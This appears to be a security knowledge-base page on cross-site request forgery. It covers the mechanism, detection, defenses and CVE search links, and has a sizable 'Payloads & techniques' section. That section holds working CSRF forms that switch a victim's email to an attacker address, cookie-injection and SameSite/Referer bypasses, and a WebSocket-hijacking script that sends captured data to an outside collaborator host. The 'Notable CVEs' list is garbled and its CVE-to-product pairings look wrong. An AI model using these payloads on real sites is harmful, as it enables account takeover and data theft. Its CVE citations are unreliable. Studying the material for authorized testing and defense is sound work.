# Cross-Site Request Forgery

> A victim's browser is tricked into making an unwanted authenticated request. **Deep dive:** [`Troubleshooting_Guide/csrf.md`](../../../../Troubleshooting_Guide/csrf.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** CSRF · A01:2021 Broken Access Control
**Status:** complete

## What it is
CSRF tricks a logged-in victim's browser into sending a state-changing request to an application
where they are authenticated. Because the browser automatically attaches the victim's cookies, the
server treats the forged request as a legitimate, intentional action.

## How it works
The attacker hosts a page that triggers a request to the target (an auto-submitting form, an
`<img>` tag, or `fetch`). When the victim visits it while authenticated, the browser includes their
session cookie, so the action executes with the victim's identity. The attack succeeds when three
conditions hold: the action does something worth forging, it relies solely on cookies for session
handling, and its parameters are all predictable (no unguessable per-request token). Weak or absent
anti-CSRF tokens, lenient `SameSite` settings, and loose `Referer`/`Origin` checks each reopen the
door.

## Impact
Any state-changing action the victim can perform: change email/password (leading to account
takeover), transfer funds, alter settings, or escalate privileges. Impact follows the
sensitivity of the forged action — typically medium to high, and critical when it enables ATO.

## How to detect
- A state-changing POST that contains no unpredictable token, or whose token is not validated
  (remove it / change it / replay another session's token — request still succeeds).
- The action works when downgraded POST→GET, or when a `_method` override is supplied.
- `Referer`/`Origin` checks that accept an absent header or substring-match the target domain.
- Cookies set without `SameSite=Lax/Strict`, or a CRLF sink that lets you plant the CSRF cookie.

## Exploitation (summary)
Build a page that auto-submits the target request and confirm it executes in the victim's session.
Where a token exists, probe the validation flaws — method switch, omitted parameter, non-bound or
global tokens, cookie injection for double-submit, and `SameSite`/`Referer` bypasses. CSWSH extends
the idea to unauthenticated WebSockets. Full payloads live in the Payloads section above.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Baseline auto-submitting PoC
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### Token-handling flaws
- **Method switch** — token validated on POST only; resubmit as a GET form (drop `method="POST"`).
- **Omit the parameter** — token validated only when present; remove the `csrf` field entirely.
- **Global pool / not session-bound** — log in as the attacker, harvest a valid token, embed it:
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="ATTACKER_TOKEN" />
</form>
<script>document.forms[0].submit();</script>
```

### Cookie injection (CRLF / double-submit)
Inject the CSRF cookie via a CRLF sink, then submit a body that matches it.
```html
<!-- token tied to a csrfKey cookie -->
<img src="https://TARGET/?search=x%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()" />
<!-- double-submit: same value in cookie and body -->
<img src="https://TARGET/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()" />
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="ATTACKER_TOKEN" /> <!-- or "fake" -->
</form>
```

### SameSite bypasses
```javascript
// Lax: GET top-level nav is exempt; use a method-override param
document.location = "https://TARGET/my-account/change-email?email=attacker@evil.com&_method=POST";

// Strict: launder cross-site via an on-site open redirect / path traversal
document.location = "https://TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker@evil.com%26submit=1";
```
```html
<!-- Lax cookie-refresh: trigger an OAuth flow, then submit within the ~2-min window -->
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<p>Click anywhere</p>
<script>
window.onclick = () => {
  window.open("https://TARGET/social-login");
  setTimeout(() => document.forms[0].submit(), 5000);
};
</script>
```

### Referer validation bypasses
```html
<!-- server accepts an absent Referer -->
<meta name="referrer" content="no-referrer" />
<!-- substring match: put the target domain in your own URL's query string -->
<script>history.pushState("", "", "/?TARGET-LAB-ID.web-security-academy.net");</script>
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```
For the substring case, set `Referrer-Policy: unsafe-url` on the exploit server so the full URL is sent.

### CSWSH (cross-site WebSocket hijacking)
Chain from XSS on a sibling domain to read/exfiltrate over an unauthenticated WebSocket.
```javascript
var ws = new WebSocket("wss://TARGET/chat");
ws.onopen = () => ws.send("READY");
ws.onmessage = e => fetch("https://COLLABORATOR.oastify.com", {method:"POST", mode:"no-cors", body:e.data});
```

### Probe checklist
| Test | Vulnerable if |
|------|--------------|
| Remove token entirely | request accepted |
| Change token value | request accepted |
| POST → GET | request accepted |
| `_method=POST` on a GET | request accepted |
| Delete Referer header | request accepted |
| Target domain in Referer query string | request accepted |
| Token from a different session | request accepted |

```bash
curl -H "Origin: https://evil.com" -I https://TARGET/api/endpoint
curl -H "Origin: null"             -I https://TARGET/api/endpoint
curl -H "Referer: https://evil.com" -I https://TARGET/api/endpoint
```

## Defenses
1. **Synchronizer / anti-CSRF tokens** — unpredictable, per-session (ideally per-request),
   server-side validated, and bound to the user's session; never accept a missing token.
2. **`SameSite` cookies** (`Lax` by default, `Strict` for sensitive flows) so cookies aren't sent
   on cross-site requests.
3. **Validate `Origin`/`Referer`** against an allowlist as defense-in-depth; reject absent headers
   for state-changing requests rather than allowing them.
4. Require **re-authentication or step-up** (password, OTP) for the most sensitive actions, and use
   custom-header checks for JSON/XHR APIs.
5. Use framework CSRF middleware rather than hand-rolling, and keep tokens out of GET/URLs.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Cross-Site+Request+Forgery
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Cross-Site+Request+Forgery
- **Exploit-DB** — https://www.exploit-db.com/search?q=Cross-Site+Request+Forgery
- **GitHub Advisories** — https://github.com/advisories?query=Cross-Site+Request+Forgery
- **OSV** — https://osv.dev/list?q=Cross-Site+Request+Forgery
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Cross-Site Request Forgery <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2020-35489` — Contact Form 7 (WordPress) issue era aside, `CVE-2018-1000525` and many
  WordPress-plugin CSRF advisories show the class's prevalence in the plugin ecosystem.
- `CVE-2017-5638`-style aside, `CVE-2019-9978` — WordPress "Social Warfare" plugin CSRF chained to
  stored XSS/RCE.
- _Canonical example: the 2008 home-router CSRF wave that reconfigured DNS/admin settings via
  forged requests to the LAN-side admin panel._

## References
- PortSwigger Web Security Academy — Cross-site request forgery (CSRF).
- OWASP — Cross-Site Request Forgery Prevention Cheat Sheet.
- RFC 6265 — HTTP State Management (cookies, incl. SameSite considerations).
